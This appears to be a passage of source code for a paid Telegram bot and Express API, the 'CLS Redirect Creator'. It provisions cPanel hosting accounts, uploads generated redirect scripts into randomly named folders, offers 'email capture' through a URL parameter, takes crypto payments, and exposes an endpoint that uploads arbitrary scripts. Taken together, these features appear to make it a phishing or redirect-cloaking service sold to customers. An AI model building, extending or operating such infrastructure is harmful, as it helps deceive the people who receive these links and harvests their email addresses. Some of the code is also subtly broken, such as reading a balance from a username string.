          `⏳ Please wait while we work our magic...`,
          { parse_mode: "Markdown" },
        );
      }

      try {
        // Step 1: Create cPanel account
        log.info({ domain }, "Starting domain provisioning");
        const { user, password, ip } = await createAccount(domain, log);

        // Update status message
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          statusMessage.message_id,
          null,
          `🎯 *CLS Redirect Creator*\n\n` +
          `✅ Hosting account created successfully!\n` +
          `🔧 Installing redirect scripts...`,
          { parse_mode: "Markdown" }
        );

        // Step 2: Create 3 folders and upload script files
        const urls = [];

        for (let i = 1; i <= 3; i++) {
          const folderName = rInt(100, 999).toString();
          const fileName = rFile();

          try {
            // Update progress
            await ctx.telegram.editMessageText(
              ctx.chat.id,
              statusMessage.message_id,
              null,
              `🎯 *CLS Redirect Creator*\n\n` +
              `✅ Hosting account ready!\n` +
              `🔧 Installing redirect scripts... (${i}/3)\n` +
              `⚡ Almost there...`,
              { parse_mode: "Markdown" }
            );

            // Create directory
            await createDirectory(user, folderName);
            log.info({ user, folderName }, "Directory created");

            // Generate and upload script content
            const scriptContent = generateCustomScriptContent(redirectUrl);
            await uploadScriptFile(user, folderName, fileName, scriptContent);

            const url = `https://${domain}/${folderName}/${fileName}`;
            urls.push(url);

            log.info({ user, url }, "Script file uploaded");
          } catch (err) {
            log.error(
              { err: err.message, folderName },
              "Failed to create folder or upload file",
            );
            throw new Error(`Failed to setup folder ${i}: ${err.message}`);
          }
        }

        // Step 3: Replace status message with final results
        const responseMessage =
          `🎉 *CLS Redirect Successfully Created!*\n\n` +
          `🌐 *Your Domain:* \`${domain}\`\n\n` +
          `🚀 *Live Redirect URLs:*\n` +
          urls.map((url, index) => `${index + 1}. ${url}`).join("\n") +
          "\n\n" +
          `📧 *Email Capture Feature:* Add ?email= parameter\n` +
          `*Usage:* yourlink.html?email=user@domain.com`;

        // Replace the status message with final results
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          statusMessage.message_id,
          null,
          responseMessage,
          { parse_mode: "Markdown" }
        );

        // Save to user history (without sensitive server details)
        const historyItem = {
          domain: domain,
          redirectUrl: redirectUrl,
          date: new Date(),
          urls: urls
          // Server credentials not stored in user history for security
        };
        addUserHistory(ctx.from.id, historyItem);

        // Update user stats
        const userData = getUserData(ctx.from.id);
        const userHistory = loadUserHistory(ctx.from.id);
        userData.totalDomains = userHistory.length;
        saveUserData(ctx.from.id, userData);

        log.info(
          { domain, urls, ip },
          "Domain provisioning completed successfully",
        );

        // Send admin notification with IP address
        if (process.env.ADMIN_ID && process.env.ADMIN_ID !== "your_telegram_admin_user_id" && bot) {
          try {
            await bot.telegram.sendMessage(
              process.env.ADMIN_ID,
              `🎉 *CLS Redirect Successfully Created*\n\n` +
              `👤 User: @${ctx.from.username || 'Unknown'} (${ctx.from.id})\n` +
              `👤 Name: ${ctx.from.first_name || 'Unknown'}\n` +
              `🌐 Domain: \`${domain}\`\n` +
              `🎯 Redirects To: ${redirectUrl}\n` +
              `🖥️ Server IP: \`${ip}\`\n` +
              `💰 Cost: ${isAdminFree ? 'VIP Access - Free' : '$80'}\n` +
              `📅 Date: ${new Date().toLocaleString()}\n\n` +
              `🚀 Total URLs Created: ${urls.length}\n` +
              `🆔 Request ID: \`${requestId}\`\n\n` +
              `📊 User Balance: $${user.balance.toFixed(2)}`,
              { parse_mode: "Markdown" }
            );
            log.info({ requestId, adminId: process.env.ADMIN_ID }, "Admin notification sent successfully");
          } catch (adminError) {
            log.error({ 
              adminError: adminError.message, 
              adminId: process.env.ADMIN_ID,
              requestId 
            }, "Failed to send admin notification");
          }
        }
      } catch (error) {
        log.error(
          { error: error.message, domain },
          "Domain provisioning failed",
        );

        // If we have a status message, edit it to show the error
        if (statusMessage) {
          try {
            await ctx.telegram.editMessageText(
              ctx.chat.id,
              statusMessage.message_id,
              null,
              `❌ *CLS Redirect Creation Failed*\n\n` +
              `🔧 Technical Error: ${error.message}\n\n` +
              `💡 Don't worry! Use /start to try again.\n` +
              `🆔 Request ID: \`${requestId}\``,
              { parse_mode: "Markdown" }
            );
          } catch (editError) {
            // If editing fails, send a new message
            await ctx.reply(
              `❌ *CLS Redirect Creation Failed*\n\n` +
              `🔧 Technical Error: ${error.message}\n\n` +
              `💡 Don't worry! Use /start to try again.\n` +
              `🆔 Request ID: \`${requestId}\``,
              { parse_mode: "Markdown" },
            );
          }
        } else {
          await ctx.reply(
            `❌ *CLS Redirect Creation Failed*\n\n` +
            `🔧 Technical Error: ${error.message}\n\n` +
            `💡 Don't worry! Use /start to try again.\n` +
            `🆔 Request ID: \`${requestId}\``,
            { parse_mode: "Markdown" },
          );
        }
      }

      // Clear session
      sessions.delete(ctx.from.id);
    } else {
      // No active session
      return ctx.reply("Please use /start to begin domain provisioning.");
    }
  });

  // ==========================================
  // INLINE KEYBOARD CALLBACK HANDLERS
  // ==========================================

bot.on('callback_query', async (ctx) => {
    const callbackData = ctx.callbackQuery.data;
    const session = getSession(ctx);
    const user = getUserData(ctx.from.id);

    // Always answer callback query first to remove loading state
    await ctx.answerCbQuery();

    try {
      // Handle main menu actions
      if (callbackData === 'topup') {
        session.awaiting_amount = true;
        return ctx.editMessageText(
          `💎 *CLS Account Balance*\n\n` +
          `💰 Current Balance: $${user.balance.toFixed(2)}\n\n` +
          `Enter the amount you want to add (USD):\n` +
          `Example: 50`,
          { parse_mode: "Markdown" }
        );
      }

      if (callbackData === 'redirect') {
        const user = getUserData(ctx.from.id);
        const requiredAmount = 80;

        // Check if user has admin free access or is admin
        const hasAdminAccess = session.admin_free_access || 
                              (process.env.ADMIN_ID && ctx.from.id.toString() === process.env.ADMIN_ID);

        if (!hasAdminAccess && user.balance < requiredAmount) {
          return ctx.editMessageText(
            `💎 *CLS Redirect Service*\n\n` +
            `💰 *Insufficient Balance*\n` +
            `Current Balance: $${user.balance.toFixed(2)}\n` +
            `Service Cost: $${requiredAmount.toFixed(2)}\n` +
            `Additional Needed: $${(requiredAmount - user.balance).toFixed(2)}\n\n` +
            `💳 Please add funds to your account or request VIP access.`,
            { 
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [{ text: '💳 Add Funds', callback_data: 'topup' }],
                  [{ text: '🔑 Request VIP Access', callback_data: 'admin_access' }],
                  [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                ]
              }
            }
          );
        }

        session.awaiting_domain = true;

        if (hasAdminAccess) {
          return ctx.editMessageText(
            "🎯 *CLS Redirect Creator*\n\n" +
              "✨ *Format:* `domain.com target-url`\n" +
              "📝 *Example:* `mysite.com https://facebook.com`\n\n" +
              "🎁 *VIP Access Active* - Complimentary service\n" +
              "🚀 Your redirect will be live in seconds!",
            { parse_mode: "Markdown" }
          );
        } else {
          return ctx.editMessageText(
            "🎯 *CLS Redirect Creator*\n\n" +
              "✨ *Format:* `domain.com target-url`\n" +
              "📝 *Example:* `mysite.com https://facebook.com`\n\n" +
              `💰 *Service Cost:* $${requiredAmount}\n` +
              "🚀 Your redirect will be live in seconds!",
            { parse_mode: "Markdown" }
          );
        }
      }

      if (callbackData === 'profile') {
        const user = getUserData(ctx.from.id);
        const userHistory = loadUserHistory(ctx.from.id);
        
        // Calculate total clicks across all user domains
        const totalClicks = userHistory.reduce((total, domain) => {
          return total + getDomainClicks(domain.domain);
        }, 0);

        return ctx.editMessageText(
          `👤 *CLS Account Profile*\n\n` +
          `🆔 Account ID: \`${ctx.from.id}\`\n` +
          `👋 Name: ${ctx.from.first_name || 'CLS User'}\n` +
          `💰 Account Balance: $${user.balance.toFixed(2)}\n` +
          `📅 Member Since: ${user.joinDate.toDateString()}\n` +
          `🎯 Total Redirects: ${userHistory.length}\n` +
          `👆 Total Clicks: ${totalClicks}\n` +
          `⭐ Account Type: ${user.balance > 0 ? '💎 Premium' : '🆓 Free Tier'}\n\n` +
          `🚀 *CLS Services Used:*\n` +
          `• Professional redirect pages\n` +
          `• SSL certificate automation\n` +
          `• Email capture integration\n` +
          `• Real-time click tracking`,
          { 
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
              ]
            }
          }
        );
      }

      if (callbackData === 'history') {
        const userHistory = loadUserHistory(ctx.from.id);

        if (userHistory.length === 0) {
          return ctx.editMessageText(
            `📊 *CLS Redirect History*\n\n` +
            `🎯 No redirects created yet.\n` +
            `Ready to create your first professional redirect?\n\n` +
            `Click "🎯 Create Redirect" to get started!`,
            { 
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [{ text: '🎯 Create First Redirect', callback_data: 'redirect' }],
                  [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                ]
              }
            }
          );
        }

        const historyText = userHistory
          .slice(-10) // Show last 10 domains
          .map((domain, index) => {
            const clicks = getDomainClicks(domain.domain);
            return `${index + 1}. 🌐 \`${domain.domain}\`\n` +
            `   📅 ${domain.date.toDateString()}\n` +
            `   🎯 ➜ ${domain.redirectUrl}\n` +
            `   👆 Clicks: ${clicks}\n`;
          })
          .join('\n');

        return ctx.editMessageText(
          `📊 *CLS Redirect History*\n\n` +
          `🎯 *Recent Redirects* (Last ${Math.min(userHistory.length, 10)})\n\n` +
          historyText +
          `\n\n✨ Total CLS Redirects Created: ${userHistory.length}\n` +
          `🚀 All with professional loading pages & SSL`,
          { 
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
              ]
            }
          }
        );
      }

      // Handle admin access request
      if (callbackData === 'admin_access') {
        const user = getUserData(ctx.from.id);

        // Check if user is admin - gets free access
        const log = L("admin-access");
        log.info({
          userId: ctx.from.id,
          adminId: process.env.ADMIN_ID,
          userIdStr: ctx.from.id.toString(),
          isMatch: ctx.from.id.toString() === process.env.ADMIN_ID
        }, "Admin access check");

        if (process.env.ADMIN_ID && ctx.from.id.toString() === process.env.ADMIN_ID) {
          session.awaiting_domain = true;
          session.admin_free_access = true;

          return ctx.editMessageText(
            "🔑 *Admin Access - Free Access Granted*\n\n" +
            "✨ Send: `domain.com redirect-url`\n" +
            "📝 Example: `mysite.com https://fb.com`\n\n" +
            "💎 Free access for admin - no payment required",
            { parse_mode: "Markdown" }
          );
        }

        // For regular users - send approval request to admin
        const requestId = crypto.randomUUID().slice(0, 8);
        const adminRequest = {
          id: requestId,
          userId: ctx.from.id,
          username: ctx.from.username || 'Unknown',
          firstName: ctx.from.first_name || 'Unknown',
          type: 'admin_access',
          date: new Date(),
          status: 'pending'
        };

        topupRequests.set(requestId, adminRequest);

        // Send to admin for approval
        if (process.env.ADMIN_ID && process.env.ADMIN_ID !== "your_telegram_admin_user_id") {
          try {
            const adminKeyboard = {
              inline_keyboard: [
                [
                  { text: '✅ Grant Access', callback_data: `grant_access_${requestId}` },
                  { text: '❌ Deny Access', callback_data: `deny_access_${requestId}` }
                ]
              ]
            };

            await bot.telegram.sendMessage(
              process.env.ADMIN_ID,
              `🔑 *Admin Access Request*\n\n` +
              `👤 User: @${adminRequest.username} (${adminRequest.userId})\n` +
              `👋 Name: ${adminRequest.firstName}\n` +
              `📅 Date: ${adminRequest.date.toLocaleString()}\n` +
              `🆔 Request ID: \`${requestId}\`\n\n` +
              `User is requesting free domain provisioning access.`,
              { 
                parse_mode: "Markdown",
                reply_markup: adminKeyboard
              }
            );
          } catch (adminError) {
            console.log("Failed to send admin notification");
          }
        }

        return ctx.editMessageText(
          `🔑 *Admin Access Request Submitted*\n\n` +
          `🆔 Request ID: \`${requestId}\`\n\n` +
          `⏳ Your request has been sent to admin for approval.\n` +
          `You will be notified once it's processed.\n\n` +
          `If approved, you'll get free domain provisioning access.`,
          { 
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
              ]
            }
          }
        );
      }

      // Handle crypto selection
      if (callbackData.startsWith('select_')) {
        const cryptoType = callbackData.replace('select_', '');
        session.selected_crypto = cryptoType;
        session.awaiting_amount = true;

        const cryptoNames = {
          'BTC': '₿ Bitcoin (BTC)',
          'USDT_TRC20': '🟡 Tether TRC20',
          'USDT_ERC20': '💎 USDT ERC20'
        };

        return ctx.editMessageText(
          `💰 *${cryptoNames[cryptoType]}*\n\n` +
          `Please enter the amount you want to top up (in USD):\n\n` +
          `Example: 50`,
          { parse_mode: "Markdown" }
        );
      }

      // Handle crypto payment selection
      if (callbackData.startsWith('pay_')) {
        const parts = callbackData.split('_');
        let cryptoType, amount;
        
        if (parts.length === 4) {
          // Format: pay_USDT_TRC20_50 or pay_USDT_ERC20_50
          cryptoType = `${parts[1]}_${parts[2]}`;
          amount = parts[3];
        } else {
          // Format: pay_BTC_50
          cryptoType = parts[1];
          amount = parts[2];
        }
        
        const usdAmount = parseFloat(amount);
        const paymentData = await generateTopUpMessage(usdAmount, cryptoType);
        
        await ctx.editMessageText(paymentData.text, { 
          parse_mode: "Markdown",
          reply_markup: paymentData.keyboard
        });
        return;
      }

      // Handle payment confirmation
      if (callbackData.startsWith('paid_')) {
        const parts = callbackData.split('_');
        let cryptoType, amount;
        
        if (parts.length === 4) {
          cryptoType = `${parts[1]}_${parts[2]}`;
          amount = parts[3];
        } else {
          cryptoType = parts[1];
          amount = parts[2];
        }
        
        const session = getSession(ctx);
        session.awaiting_payment_proof = {
          cryptoType,
          amount: parseFloat(amount)
        };
        
        await ctx.editMessageText(
          `📸 *Payment Confirmation Required*\n\n` +
          `Please provide either:\n` +
          `📷 Screenshot of your payment confirmation\n` +
          `OR\n` +
          `🔗 Transaction hash (TXID)\n\n` +
          `For screenshot, it should show:\n` +
          `• Payment amount: $${amount}\n` +
          `• Destination address\n` +
          `• Transaction confirmation\n\n` +
          `*You can add transaction hash as caption or send it separately*`,
          { parse_mode: "Markdown" }
        );
        return;
      }

      // Handle payment cancellation
      if (callbackData === 'cancel_payment') {
        await ctx.editMessageText(
          "❌ Payment cancelled. Use /start to return to main menu.",
          { parse_mode: "Markdown" }
        );
        return;
      }

      // Handle topup cancellation
      if (callbackData === 'cancel_topup') {
        await ctx.editMessageText(
          "❌ Top-up cancelled. Use /start to return to main menu.",
          { parse_mode: "Markdown" }
        );
        return;
      }

      // Handle payment approval
      if (callbackData.startsWith('approve_payment_')) {
        const requestId = callbackData.replace('approve_payment_', '');
        const userId = requestId.split('_')[1];
        
        await ctx.answerCbQuery('Processing payment approval...');
        
        try {
          // Read user data from file
          const userDataDir = path.join(__dirname, 'user_data');
          const userFilePath = path.join(userDataDir, `${userId}.json`);
          
          if (!fs.existsSync(userFilePath)) {
            await ctx.answerCbQuery('User data not found', { show_alert: true });
            return;
          }
          
          const userData = JSON.parse(fs.readFileSync(userFilePath, 'utf8'));
          const paymentRequest = userData.pending_payments?.find(p => p.id === requestId);
          
          if (paymentRequest && paymentRequest.status === 'pending') {
            // Add amount to user balance
            userData.balance = (userData.balance || 0) + paymentRequest.amount;
            
            // Mark payment as approved
            paymentRequest.status = 'approved';
            paymentRequest.approved_at = new Date().toISOString();
            
            // Save updated user data
            fs.writeFileSync(userFilePath, JSON.stringify(userData, null, 2));
            
            // Update using persistent storage functions
            updateUserBalance(parseInt(userId), userData.balance);
            
            // Notify user
            try {
              await bot.telegram.sendMessage(userId, 
                `✅ *Payment Approved!*\n\n` +
                `💰 Amount: $${paymentRequest.amount}\n` +
                `💳 New Balance: $${userData.balance.toFixed(2)}\n\n` +
                `Your payment has been verified and added to your account.\n` +
                `You can now use your balance for domain provisioning.`,
                { parse_mode: "Markdown" }
              );
            } catch (userError) {
              console.log("Failed to notify user of payment approval:", userError.message);
            }
            
            // Send confirmation to admin
            await ctx.answerCbQuery('✅ Payment approved successfully!', { show_alert: true });
            
            await bot.telegram.sendMessage(
              ctx.from.id,
              `✅ *Payment Approved Successfully*\n\n` +
              `💰 Amount: $${paymentRequest.amount}\n` +
              `👤 User ID: ${userId}\n` +
              `💳 User's New Balance: $${userData.balance.toFixed(2)}\n` +
              `🆔 Request ID: \`${requestId}\`\n\n` +
              `User has been notified and balance updated.`,
              { parse_mode: "Markdown" }
            );
          } else {
            await bot.telegram.sendMessage(
              ctx.from.id,
              "❌ Payment request not found or already processed."
            );
          }
        } catch (error) {
          console.error('Payment approval error:', error);
          await bot.telegram.sendMessage(
            ctx.from.id,
            "❌ Error processing payment approval. Please check logs."
          );
        }
        return;
      }

      // Handle payment rejection
      if (callbackData.startsWith('reject_payment_')) {
        const requestId = callbackData.replace('reject_payment_', '');
        const userId = requestId.split('_')[1];
        
        await ctx.answerCbQuery('Processing payment rejection...');
        
        try {
          // Read user data from file
          const userDataDir = path.join(__dirname, 'user_data');
          const userFilePath = path.join(userDataDir, `${userId}.json`);
          
          if (!fs.existsSync(userFilePath)) {
            await ctx.answerCbQuery('User data not found', { show_alert: true });
            return;
          }
          
          const userData = JSON.parse(fs.readFileSync(userFilePath, 'utf8'));
          const paymentRequest = userData.pending_payments?.find(p => p.id === requestId);
          
          if (paymentRequest && paymentRequest.status === 'pending') {
            // Mark payment as rejected
            paymentRequest.status = 'rejected';
            paymentRequest.rejected_at = new Date().toISOString();
            
            // Save updated user data
            fs.writeFileSync(userFilePath, JSON.stringify(userData, null, 2));
            
            // Notify user
            try {
              await bot.telegram.sendMessage(userId, 
                `❌ *Payment Rejected*\n\n` +
                `💰 Amount: $${paymentRequest.amount}\n` +
                `🆔 Request ID: \`${requestId}\`\n\n` +
                `Your payment verification was rejected.\n` +
                `Please ensure you sent the correct amount and provide valid proof.\n\n` +
                `Contact support if you believe this is an error.`,
                { parse_mode: "Markdown" }
              );
            } catch (userError) {
              console.log("Failed to notify user of payment rejection");
            }
            
            // Send confirmation to admin
            await ctx.answerCbQuery('❌ Payment rejected!', { show_alert: true });
            
            await bot.telegram.sendMessage(
              ctx.from.id,
              `❌ *Payment Rejected*\n\n` +
              `💰 Amount: $${paymentRequest.amount}\n` +
              `👤 User ID: ${userId}\n` +
              `🆔 Request ID: \`${requestId}\`\n\n` +
              `User has been notified of the rejection.`,
              { parse_mode: "Markdown" }
            );
          } else {
            await bot.telegram.sendMessage(
              ctx.from.id,
              "❌ Payment request not found or already processed."
            );
          }
        } catch (error) {
          console.error('Payment rejection error:', error);
          await bot.telegram.sendMessage(
            ctx.from.id,
            "❌ Error processing payment rejection. Please check logs."
          );
        }
        return;
      }

      // Handle back to menu
      if (callbackData === 'back_menu') {
        // Clear any pending sessions
        Object.keys(session).forEach(key => delete session[key]);

        return ctx.editMessageText(
          `🏠 *Main Menu*`,
          { 
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [
                  { text: '💳 Top Up', callback_data: 'topup' },
                  { text: '🎯 Create Redirect', callback_data: 'redirect' }
                ],
                [
                  { text: '👤 Profile', callback_data: 'profile' },
                  { text: '📋 History', callback_data: 'history' }
                ],
                [
                  { text: '🔑 Admin Access', callback_data: 'admin_access' }
                ]
              ]
            }
          }
        );
      }
    } catch (error) {
      console.log('Callback error:', error.message);
    }

    // Handle admin access approval/denial callbacks
    if (callbackData.startsWith('grant_access_') || callbackData.startsWith('deny_access_')) {
      const [action, , requestId] = callbackData.split('_');
      const request = topupRequests.get(requestId);

      if (!request) {
        return;
      }

      if (action === 'grant') {
        // Grant free admin access to user
        const userSession = sessions.get(request.userId) || {};
        userSession.admin_free_access = true;
        sessions.set(request.userId, userSession);

        request.status = 'approved';

        // Notify user
        try {
          await bot.telegram.sendMessage(
            request.userId,
            `✅ *Admin Access Granted!*\n\n` +
            `🆔 Request ID: \`${requestId}\`\n\n` +
            `You now have free domain provisioning access.\n` +
            `Use "🔗 Get Redirect" to provision your domain without payment.`,
            { parse_mode: "Markdown" }
          );
        } catch (error) {
          console.log("Failed to notify user");
        }

        await ctx.editMessageText(
          `✅ *ACCESS GRANTED*\n\n${ctx.callbackQuery.message.text.replace('🔑 *Admin Access Request*', '🔑 *Admin Access Request - GRANTED*')}`,
          { parse_mode: "Markdown" }
        );

      } else if (action === 'deny') {
        request.status = 'denied';

        // Notify user
        try {
          await bot.telegram.sendMessage(
            request.userId,
            `❌ *Admin Access Denied*\n\n` +
            `🆔 Request ID: \`${requestId}\`\n\n` +
            `Your admin access request has been denied.`,
            { parse_mode: "Markdown" }
          );
        } catch (error) {
          console.log("Failed to notify user");
        }

        await ctx.editMessageText(
          `❌ *ACCESS DENIED*\n\n${ctx.callbackQuery.message.text.replace('🔑 *Admin Access Request*', '🔑 *Admin Access Request - DENIED*')}`,
          { parse_mode: "Markdown" }
        );
      }
    }

    // Handle admin approval/rejection callbacks for topups
    if (callbackData.startsWith('approve_') || callbackData.startsWith('reject_')) {
      const [action, requestId] = callbackData.split('_');
      const request = topupRequests.get(requestId);

      if (!request) {
        return ctx.answerCbQuery('Request not found');
      }

      if (action === 'approve') {
        // Update user balance
        const userData = getUserData(request.userId);
        userData.balance += request.amount;
        request.status = 'approved';

        // Notify user
        try {
          await bot.telegram.sendMessage(
            request.userId,
            `✅ *Top-Up Approved!*\n\n` +
            `💰 Amount: $${request.amount}\n` +
            `💳 New Balance: $${userData.balance.toFixed(2)}\n` +
            `🆔 Request ID: \`${requestId}\`\n\n` +
            `Thank you! Your account has been credited.`,
            { parse_mode: "Markdown" }
          );
        } catch (error) {
          console.log("Failed to notify user");
        }

        await ctx.editMessageText(
          `✅ *APPROVED*\n\n${ctx.callbackQuery.message.text.replace('💳 *New Top-Up Request*', '💳 *Top-Up Request - APPROVED*')}`,
          { parse_mode: "Markdown" }
        );

        await ctx.answerCbQuery('✅ Top-up approved!');

      } else if (action === 'reject') {
        request.status = 'rejected';

        // Notify user
        try {
          await bot.telegram.sendMessage(
            request.userId,
            `❌ *Top-Up Rejected*\n\n` +
            `💰 Amount: $${request.amount}\n` +
            `🆔 Request ID: \`${requestId}\`\n\n` +
            `Your top-up request has been rejected. Please contact support if you have questions.`,
            { parse_mode: "Markdown" }
          );
        } catch (error) {
          console.log("Failed to notify user");
        }

        await ctx.editMessageText(
          `❌ *REJECTED*\n\n${ctx.callbackQuery.message.text.replace('💳 *New Top-Up Request*', '💳 *Top-Up Request - REJECTED*')}`,
          { parse_mode: "Markdown" }
        );

        await ctx.answerCbQuery('❌ Top-up rejected!');
      }
    }
  });

  // Enhanced error handling
  bot.catch((err, ctx) => {
    const log = L("bot-error");
    log.error(
      {
        error: err.message,
        stack: err.stack,
        userId: ctx.from?.id,
        username: ctx.from?.username || "unknown",
        chatId: ctx.chat?.id,
        messageText: ctx.message?.text || "unknown",
      },
      "💥 Bot error occurred",
    );

    return ctx.reply(
      "❌ *Oops! Something went wrong*\n\n" +
        "Please try again with /start or contact support if the issue persists.\n\n" +
        `Error ID: \`${crypto.randomUUID().slice(0, 8)}\``,
      { parse_mode: "Markdown" },
    );
  });

  // Webhook endpoint
  app.use(`/bot${process.env.TELEGRAM_BOT_TOKEN}`, bot.webhookCallback("/"));
}

// ==========================================
// EXPRESS SERVER & API ENDPOINTS
// ==========================================

const stats = {
  domainsCreated: 0,
  requestsProcessed: 0,
  startTime: Date.now()
};

// Health check endpoint
app.get("/health", (req, res) => {
  const log = L("health-check");
  const healthData = {
    status: "ok",
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memoryUsage: process.memoryUsage(),
    botStatus: bot ? "active" : "inactive",
    environment: process.env.NODE_ENV || "development",
  };

  log.debug(healthData, "💊 Health check requested");
  res.json(healthData);
});

// Statistics endpoint
app.get("/api/stats", (req, res) => {
  res.json({
    ...stats,
    activeSessions: sessions.size,
    rateLimitedUsers: rateLimits.size
  });
});

// Test API endpoint for domain provisioning
app.post("/api/provision", express.json(), async (req, res) => {
  const { domain } = req.body;

  if (!domain) {
    return res.status(400).json({ error: "Domain is required" });
  }

  const log = L(crypto.randomUUID().slice(0, 8));

  try {
    // Step 1: Create cPanel account
    log.info({ domain }, "Starting domain provisioning via API");
    const { user, password, ip } = await createAccount(domain, log);

    // Step 2: Create 3 folders and upload script files
    const urls = [];
    const redirectUrl = process.env.DEFAULT_REDIRECT_URL || "https://example.com";

    for (let i = 1; i <= 3; i++) {
      const folderName = rInt(100, 999).toString();
      const fileName = rFile();

      try {
        // Create directory
        await createDirectory(user, folderName);
        log.info({ user, folderName }, "Directory created");

        // Generate and upload script content
        const scriptContent = generateCustomScriptContent(redirectUrl);
        await uploadScriptFile(user, folderName, fileName, scriptContent);

        const url = `https://${domain}/${folderName}/${fileName}`;
        urls.push(url);

        log.info({ user, url }, "Script file uploaded");
      } catch (err) {
        log.error(
          { err: err.message, folderName },
          "Failed to create folder or upload file",
        );
        throw new Error(`Failed to setup folder ${i}: ${err.message}`);
      }
    }

    const result = {
      domain,
      script_urls: urls,
      message: "Domain provisioning completed successfully",
      // Sensitive data excluded from API response for security
    };

    log.info(
      { domain, urls, ip },
      "Domain provisioning completed successfully via API",
    );
    res.json(result);
  } catch (error) {
    log.error(
      { error: error.message, domain },
      "Domain provisioning failed via API",
    );
    res.status(500).json({
      error: "Provisioning failed",
      message: error.message,
    });
  }
});

// Custom script file upload endpoint
app.post("/api/upload-script", express.json(), async (req, res) => {
  const { domain, scriptContent, customFileName } = req.body;

  if (!domain || !scriptContent) {
    return res
      .status(400)
      .json({ error: "Domain and script content are required" });
  }

  const log = L(crypto.randomUUID().slice(0, 8));

  try {
    // Find existing account by domain
    const accounts = await WHM.get("/json-api/listaccts?api.version=1");
    const account = accounts.data.data.acct.find(
      (acc) => acc.domain === domain,
    );

    if (!account) {
      return res
        .status(404)
        .json({ error: "Domain not found in hosting accounts" });
    }

    const folderName = rInt(100, 999).toString();
    const fileName = customFileName || rFile();

    // Create directory and upload custom script
    await createDirectory(account.user, folderName);
    await uploadScriptFile(account.user, folderName, fileName, scriptContent);

    const url = `https://${domain}/${folderName}/${fileName}`;

    log.info({ domain, user: account.user, url }, "Custom script uploaded");

    res.json({
      domain,
      folder: folderName,
      filename: fileName,
      url,
      message: "Custom script uploaded successfully",
    });
  } catch (error) {
    log.error({ error: error.message, domain }, "Custom script upload failed");
    res.status(500).json({
      error: "Upload failed",
      message: error.message,
    });
  }
});

// ==========================================
// SERVER STARTUP & SHUTDOWN HANDLERS
// ==========================================

const PORT = process.env.PORT || 5000;
const server = app.listen(PORT, "0.0.0.0", () => {
  const log = L("server");
  log.info({ port: PORT }, "Server started");

  // Use polling in development only if bot is initialized
  if (process.env.NODE_ENV !== "production" && bot) {
    bot.launch();
    log.info("Bot started with polling");
  } else if (!bot) {
    log.info("Bot not initialized - Telegram token missing. Dashboard available at /dashboard");
  }
});

// Graceful shutdown handlers
process.once("SIGINT", () => {
  const log = L("shutdown");
  log.info("Shutting down gracefully");
  if (bot) bot.stop("SIGINT");
  server.close();
});

process.once("SIGTERM", () => {
  const log = L("shutdown");
  log.info("Shutting down gracefully");
  if (bot) bot.stop("SIGTERM");
  server.close();
});